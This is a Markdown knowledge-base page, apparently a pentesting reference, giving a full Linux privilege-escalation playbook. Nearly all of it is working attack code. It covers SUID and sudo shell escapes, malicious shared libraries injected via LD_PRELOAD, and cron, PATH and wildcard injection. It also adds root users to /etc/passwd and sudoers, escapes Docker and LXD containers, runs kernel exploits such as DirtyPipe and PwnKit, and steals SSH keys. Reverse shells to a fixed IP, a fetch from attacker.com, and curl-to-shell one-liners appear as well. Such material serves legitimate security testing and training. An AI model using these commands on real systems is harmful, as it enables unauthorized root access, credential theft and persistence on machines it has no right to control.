---
title: Linux Privilege Escalation
category: techniques
tags: [linux, privilege-escalation, privesc, suid, sudo, kernel]
last_updated: 2025-12-27
---

# Linux Privilege Escalation

Comprehensive guide to Linux privilege escalation techniques for penetration testing and security assessments.

## Table of Contents

1. [SUID/SGID Binaries](#suidsgid-binaries)
2. [Sudo Misconfigurations](#sudo-misconfigurations)
3. [Capabilities](#capabilities)
4. [Cron Jobs](#cron-jobs)
5. [PATH Hijacking](#path-hijacking)
6. [NFS Exploitation](#nfs-exploitation)
7. [Docker/LXC Escape](#dockerlxc-escape)
8. [Kernel Exploits](#kernel-exploits)
9. [Writable System Files](#writable-system-files)
10. [SSH Key Theft](#ssh-key-theft)
11. [Wildcard Injection](#wildcard-injection)

---

## SUID/SGID Binaries

SUID (Set User ID) binaries execute with the permissions of the file owner. When owned by root, they provide potential privilege escalation vectors.

### How to Identify

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both SUID and SGID
find / -perm /6000 -type f 2>/dev/null

# More detailed with file info
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

### GTFOBins Exploitation

Reference: [https://gtfobins.github.io/](https://gtfobins.github.io/)

#### Common SUID Exploits

**find**
```bash
# find with SUID
find . -exec /bin/sh -p \; -quit

# Alternative
find . -exec /bin/bash -p \; -quit
```

**vim/vi**
```bash
# vim with SUID
vim -c ':!/bin/sh'

# Alternative
vim -c ':set shell=/bin/sh' -c ':shell'
```

**nmap (older versions < 5.21)**
```bash
# Interactive mode
nmap --interactive
!sh

# Script mode
nmap --script=<(echo 'os.execute("/bin/sh")')
```

**python**
```bash
# python with SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**perl**
```bash
perl -e 'exec "/bin/sh";'
```

**bash**
```bash
# bash with SUID (use -p to preserve privileges)
bash -p
```

**less/more**
```bash
# From less, enter:
!/bin/sh
```

**cp**
```bash
# Copy /etc/passwd, add root user, copy back
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
```

**env**
```bash
env /bin/sh -p
```

### Custom SUID Exploitation

```bash
# Identify custom SUID binaries (not standard system binaries)
find / -perm -4000 -type f 2>/dev/null | grep -v '/usr/bin\|/usr/sbin\|/bin\|/sbin'

# Analyze binary behavior
strings /path/to/suid/binary
ltrace /path/to/suid/binary
strace /path/to/suid/binary

# Look for:
# - Relative path calls (PATH hijacking)
# - System() calls with user input
# - Writable shared libraries
```

### Shared Library Injection

```bash
# Check shared library dependencies
ldd /path/to/suid/binary

# Find missing or writable libraries
# If a library is loaded from a writable path:
# 1. Create malicious library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# 2. Compile
gcc -shared -fPIC -o /writable/path/library.so /tmp/evil.c

# 3. Execute SUID binary
/path/to/suid/binary
```

---

## Sudo Misconfigurations

Sudo allows non-root users to execute commands as root. Misconfigurations are extremely common.

### How to Identify

```bash
# List sudo permissions for current user
sudo -l

# Check sudo version (for CVE vulnerabilities)
sudo -V | head -1

# View sudoers file (if readable)
cat /etc/sudoers
cat /etc/sudoers.d/*
```

### Common sudo -l Output Analysis

**Example Output:**
```
User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/find
    (ALL : ALL) NOPASSWD: /usr/bin/env
```

**Key Indicators:**
- `NOPASSWD`: No password required
- `(ALL)`: Can run as any user
- `(ALL : ALL)`: Can run as any user and group
- Specific binaries that can spawn shells

### GTFOBins Sudo Exploitation

**vim**
```bash
sudo vim -c ':!/bin/sh'
```

**find**
```bash
sudo find /etc/passwd -exec /bin/sh \;
```

**env**
```bash
sudo env /bin/sh
```

**less**
```bash
sudo less /etc/passwd
# Then type: !/bin/sh
```

**awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

**nmap**
```bash
sudo nmap --interactive
# Then type: !sh
```

**python**
```bash
sudo python -c 'import os; os.system("/bin/sh")'
```

**perl**
```bash
sudo perl -e 'exec "/bin/sh";'
```

**ruby**
```bash
sudo ruby -e 'exec "/bin/sh"'
```

**man**
```bash
sudo man man
# Then type: !/bin/sh
```

**ftp**
```bash
sudo ftp
# Then type: !/bin/sh
```

**tar**
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

**git**
```bash
sudo git -p help config
# Then type: !/bin/sh
```

**wget**
```bash
# Overwrite /etc/passwd or /etc/shadow
sudo wget http://attacker.com/passwd -O /etc/passwd
```

**apache2**
```bash
sudo apache2 -f /etc/shadow
# Displays shadow file in error message
```

### LD_PRELOAD Exploitation

If `env_keep+=LD_PRELOAD` is in sudo configuration:

```bash
# 1. Create malicious shared library
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

# 2. Compile
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c

# 3. Execute with LD_PRELOAD
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/allowed_binary
```

### LD_LIBRARY_PATH Exploitation

If `env_keep+=LD_LIBRARY_PATH` is in sudo configuration:

```bash
# 1. Find shared libraries used by sudo-allowed binary
ldd /usr/bin/allowed_binary

# 2. Create malicious library
cat > /tmp/libevil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

# 3. Compile with same name as existing library
gcc -fPIC -shared -o /tmp/libc.so.6 /tmp/libevil.c

# 4. Execute
sudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed_binary
```

### Sudo Version Exploits

**Baron Samedit (CVE-2021-3156)**
```bash
# Check if vulnerable (sudo 1.8.2 to 1.8.31p2, 1.9.0 to 1.9.5p1)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# If segfault, likely vulnerable

# Exploit
python3 CVE-2021-3156.py
```

**CVE-2019-14287 (Sudo < 1.8.28)**
```bash
# If allowed to run as any user except root:
# (ALL, !root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash
```

**CVE-2019-18634 (pwfeedback enabled)**
```bash
# Check if pwfeedback is enabled
sudo -l 2>&1 | grep pwfeedback
# Exploit with buffer overflow
```

---

## Capabilities

Linux capabilities provide fine-grained privileges, but can be misconfigured.

### How to Identify

```bash
# Find all binaries with capabilities
getcap -r / 2>/dev/null

# Check specific binary
getcap /usr/bin/python3
```

### Dangerous Capabilities

| Capability | Description | Exploitation |
|------------|-------------|--------------|
| cap_setuid | Change UID | Direct root shell |
| cap_setgid | Change GID | Change to root group |
| cap_dac_override | Bypass file permissions | Read/write any file |
| cap_dac_read_search | Bypass read permissions | Read any file |
| cap_chown | Change file ownership | Own any file |
| cap_net_raw | Use RAW sockets | Packet sniffing |
| cap_sys_admin | Various admin operations | Mount filesystems, BPF |
| cap_sys_ptrace | Trace processes | Inject code into processes |

### Exploitation Examples

**cap_setuid (Python)**
```bash
# If python has cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**cap_setuid (Perl)**
```bash
# If perl has cap_setuid+ep
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'
```

**cap_setuid (PHP)**
```bash
# If php has cap_setuid+ep
php -r "posix_setuid(0); system('/bin/sh');"
```

**cap_dac_read_search (tar)**
```bash
# If tar has cap_dac_read_search
tar cvf shadow.tar /etc/shadow
tar xvf shadow.tar
cat etc/shadow
```

**cap_dac_override**
```bash
# If python has cap_dac_override
python3 -c 'f=open("/etc/shadow","r"); print(f.read())'
# Or write to /etc/passwd
```

**cap_sys_admin**
```bash
# Mount host filesystem (in containers)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
```

---

## Cron Jobs

Cron jobs run scheduled tasks, often as root, and can be exploited through misconfigurations.

### How to Identify

```bash
# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# User cron jobs
crontab -l
ls -la /var/spool/cron/crontabs/

# Check for running cron jobs (using pspy)
./pspy64

# Check cron logs
grep CRON /var/log/syslog
cat /var/log/cron.log
```

### Writable Cron Scripts

```bash
# Find writable scripts called by cron
cat /etc/crontab | grep -v "^#" | awk '{print $7}' | xargs -I {} ls -la {} 2>/dev/null

# If script is writable:
echo '/bin/bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' >> /path/to/cron/script.sh

# Or add SUID bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/cron/script.sh
```

### Cron PATH Exploitation

```bash
# Check PATH in /etc/crontab
cat /etc/crontab
# Example: PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin

# If cron runs script without full path and first PATH directory is writable:
# Create malicious script with same name in writable PATH directory
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /home/user/scriptname

chmod +x /home/user/scriptname

# Wait for cron to execute
/tmp/rootbash -p
```

### Wildcard Injection in Cron

See [Wildcard Injection](#wildcard-injection) section.

---

## PATH Hijacking

When applications call binaries without full paths, the PATH environment variable determines which binary is executed.

### How to Identify

```bash
# Check current PATH
echo $PATH

# Find writable directories in PATH
for p in $(echo $PATH | tr ':' '\n'); do ls -ld "$p" 2>/dev/null | grep -v "root root"; done

# Analyze SUID/sudo binaries for relative paths
strings /usr/local/bin/suid-binary | grep -E '^[a-z]'
ltrace /usr/local/bin/suid-binary
strace /usr/local/bin/suid-binary 2>&1 | grep exec
```

### Exploitation

```bash
# Example: SUID binary calls 'service' without full path

# 1. Create malicious binary
echo '#!/bin/bash
/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# 2. Prepend /tmp to PATH
export PATH=/tmp:$PATH

# 3. Execute SUID binary
/usr/local/bin/suid-binary
```

**Alternative Payload:**
```bash
# Copy bash with SUID
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /tmp/service
chmod +x /tmp/service

# After executing SUID binary:
/tmp/rootbash -p
```

---

## NFS Exploitation

NFS shares with `no_root_squash` allow root on client to be root on server.

### How to Identify

```bash
# Check NFS exports on target
cat /etc/exports
showmount -e target_ip

# Look for 'no_root_squash' option
# /shared *(rw,sync,no_root_squash)
```

### How to Exploit

```bash
# On attacker machine (as root):

# 1. Mount NFS share
mkdir /mnt/nfs
mount -t nfs target_ip:/shared /mnt/nfs -o nolock

# 2. Create SUID binary on mounted share
cat > /mnt/nfs/suid.c << 'EOF'
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc /mnt/nfs/suid.c -o /mnt/nfs/suid
chmod +s /mnt/nfs/suid

# 3. On target, execute SUID binary
/shared/suid

# Alternative: Copy bash with SUID bit
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash

# On target:
/shared/rootbash -p
```

---

## Docker/LXC Escape

Being in the docker or lxd/lxc group can lead to root access.

### Docker Group Abuse

```bash
# Check if user is in docker group
id

# If in docker group:
# Method 1: Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Method 2: With full privileges
docker run -it --privileged --net=host --pid=host --ipc=host -v /:/mnt alpine chroot /mnt

# Method 3: Create SUID binary on host
docker run -v /:/mnt --rm -it alpine sh -c 'chown root:root /mnt/tmp/rootbash; chmod +s /mnt/tmp/rootbash'
```

### LXD/LXC Group Abuse

```bash
# Check if user is in lxd group
id

# 1. Build Alpine container image (on attacker machine)
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

# 2. Transfer image to target

# 3. On target, import and init container
lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# 4. Access host filesystem
cd /mnt/root
```

### Container Escape Techniques

**Privileged Container Escape:**
```bash
# If running in privileged container
# Check for host devices
fdisk -l

# Mount host disk
mount /dev/sda1 /mnt
chroot /mnt
```

**Docker Socket Escape:**
```bash
# If docker.sock is mounted
find / -name "docker.sock" 2>/dev/null
# /var/run/docker.sock

# Use docker CLI or API to escape
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

---

## Kernel Exploits

Kernel vulnerabilities provide direct root access but may cause system instability.

### Enumeration

```bash
# Kernel version
uname -a
uname -r
cat /proc/version

# Distribution info
cat /etc/*release
lsb_release -a

# Architecture
uname -m
arch
```

### Notable Kernel Exploits

#### DirtyPipe (CVE-2022-0847)
**Affected:** Linux kernel 5.8 to 5.16.11, 5.15.25, 5.10.102

```bash
# Check if vulnerable
uname -r
# Versions 5.8 <= x < 5.16.11, 5.15.25, 5.10.102

# Compile and run exploit
gcc -o dirtypipe dirtypipe.c
./dirtypipe /usr/bin/su

# Or overwrite /etc/passwd
./dirtypipe /etc/passwd 1 "${UID}:$(openssl passwd -1 password):0:0:root:/root:/bin/bash"
```

#### DirtyCow (CVE-2016-5195)
**Affected:** Linux kernel 2.6.22 to 4.8.3

```bash
# Check if vulnerable
uname -r

# Compile exploit
gcc -pthread dirty.c -o dirty -lcrypt
./dirty new_password

# Login as firefart
su firefart
```

**Variations:**
- `dirtycow.c` - Original, modifies /etc/passwd
- `cowroot.c` - More stable, creates SUID shell
- `dirty.c` - Creates user 'firefart' with specified password

#### PwnKit (CVE-2021-4034)
**Affected:** All major Linux distributions with polkit installed

```bash
# Check if vulnerable
pkexec --version
# Versions < 0.120 typically vulnerable

# Method 1: Pre-compiled exploit
./PwnKit

# Method 2: Compile from source
gcc -shared -fPIC -o pwnkit.so pwnkit.c
./pwnkit
```

**Quick One-Liner:**
```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit
```

#### Other Notable Exploits

| CVE | Name | Kernel Versions | Impact |
|-----|------|-----------------|--------|
| CVE-2022-2588 | net/sched | 3.x - 5.18 | Root |
| CVE-2022-0185 | fsconfig | 5.1 - 5.16 | Root |
| CVE-2021-22555 | Netfilter | 2.6.19 - 5.12 | Root |
| CVE-2021-3493 | OverlayFS | 4.4 - 5.11 | Root (Ubuntu) |
| CVE-2019-13272 | PTRACE_TRACEME | 4.4 - 5.1.17 | Root |
| CVE-2017-16995 | eBPF | 4.4 - 4.14 | Root |
| CVE-2017-1000112 | UFO | 4.4 - 4.12 | Root |

### Exploit Suggester

```bash
# Linux Exploit Suggester 2
./linux-exploit-suggester-2.pl

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration with exploit suggestions
./lse.sh -l 2
```

---

## Writable System Files

### /etc/passwd

```bash
# Check if writable
ls -la /etc/passwd

# If writable, add root user
# Generate password hash
openssl passwd -1 password
# Result: $1$xyz$abc...

# Add user with UID 0
echo 'hacker:$1$xyz$abc...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker
```

**Alternative - Overwrite root password:**
```bash
# Copy passwd, modify root entry
cp /etc/passwd /tmp/passwd
# Edit /tmp/passwd, replace 'x' with password hash for root
cp /tmp/passwd /etc/passwd
```

### /etc/shadow

```bash
# Check if writable (rare)
ls -la /etc/shadow

# If writable, replace root password
# Generate hash
openssl passwd -6 password

# Replace root hash in /etc/shadow
```

### /etc/sudoers

```bash
# Check if writable
ls -la /etc/sudoers

# If writable, add current user with NOPASSWD
echo 'username ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

sudo su
```

---

## SSH Key Theft

### Finding SSH Keys

```bash
# Find private keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Check common locations
ls -la /home/*/.ssh/
ls -la /root/.ssh/
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa

# Check SSH config for private key locations
cat /home/*/.ssh/config
cat /etc/ssh/ssh_config
```

### Exploiting Found Keys

```bash
# Copy key to attacker machine
# Fix permissions
chmod 600 id_rsa

# Connect as key owner
ssh -i id_rsa user@target

# If key has passphrase, crack it
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt
```

### Adding Authorized Keys

```bash
# If /root/.ssh/ or /home/user/.ssh/ is writable
# Generate key pair on attacker
ssh-keygen -t rsa -f hacker_key

# Add public key to target
echo 'ssh-rsa AAAA...key... attacker@host' >> /root/.ssh/authorized_keys

# Connect from attacker
ssh -i hacker_key root@target
```

---

## Wildcard Injection

Some commands interpret wildcards in dangerous ways when used in scripts run as root.

### tar Wildcard Injection

**Vulnerable cron job:**
```bash
# /etc/crontab
* * * * * root cd /opt/backup && tar czf backup.tar.gz *
```

**Exploitation:**
```bash
# Create malicious files in /opt/backup
cd /opt/backup

# Create payload script
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh

# Create checkpoint files (tar arguments)
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# Wait for cron job
/tmp/rootbash -p
```

### chown Wildcard Injection

**Vulnerable cron job:**
```bash
* * * * * root cd /opt/data && chown -R admin:admin *
```

**Exploitation:**
```bash
cd /opt/data

# Create symlink to /etc/passwd
ln -s /etc/passwd ./passwd

# Create reference file
touch -- '--reference=passwd'

# Wait for cron job - /etc/passwd ownership changes
```

### rsync Wildcard Injection

**Vulnerable script:**
```bash
rsync -av /home/user/* /backup/
```

**Exploitation:**
```bash
cd /home/user

# Create payload
echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' > shell.sh
chmod +x shell.sh

# Create rsync argument files
touch -- '-e sh shell.sh'
touch -- 'ignored'
```

---

## Enumeration Checklist

### Automated Tools

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 2

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# pspy (process monitoring)
./pspy64
```

### Manual Commands

```bash
# System Info
uname -a
cat /etc/*release
hostname

# User Info
id
whoami
groups
cat /etc/passwd
cat /etc/shadow 2>/dev/null
cat /etc/group

# Sudo
sudo -l
sudo -V

# SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Writable files
find / -writable -type f 2>/dev/null | grep -v '/proc\|/sys'
find / -writable -type d 2>/dev/null

# Config files
find / -name "*.conf" -type f 2>/dev/null
find / -name "*.config" -type f 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history

# Network
netstat -antup
ss -tulpn
cat /etc/hosts

# Processes
ps aux
ps -ef

# Installed software
dpkg -l
rpm -qa

# NFS
cat /etc/exports
showmount -e localhost
```

---

## References

- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
